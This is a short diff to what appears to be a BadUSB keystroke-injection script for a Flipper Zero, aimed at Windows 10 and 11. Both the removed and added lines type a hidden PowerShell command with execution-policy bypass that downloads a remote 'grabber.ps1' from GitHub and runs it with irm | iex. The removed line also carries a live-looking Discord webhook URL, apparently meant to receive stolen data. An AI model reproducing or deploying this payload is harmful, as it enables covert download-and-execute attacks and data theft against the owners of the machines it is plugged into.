@@ -6,6 +6,6 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc="https://discord.com/api/webhooks/1327931539115216946/bjHMQlIBnGw54pNLtUXOJFqHe48o5kIXaZ3DY1unUCsm-x4rQUgWaOrgaB4raMgBInFj";irm https://raw.githubusercontent.com/DasWeltall/FlipperZero/refs/heads/main/grabber.ps1 | iex
+STRING powershell -w h -NoP -Ep Bypass $dc="";irm https://raw.githubusercontent.com/DasWeltall/FlipperZero/refs/heads/main/BadUSB/grabber.ps1 | iex
 DELAY 100
 ENTER
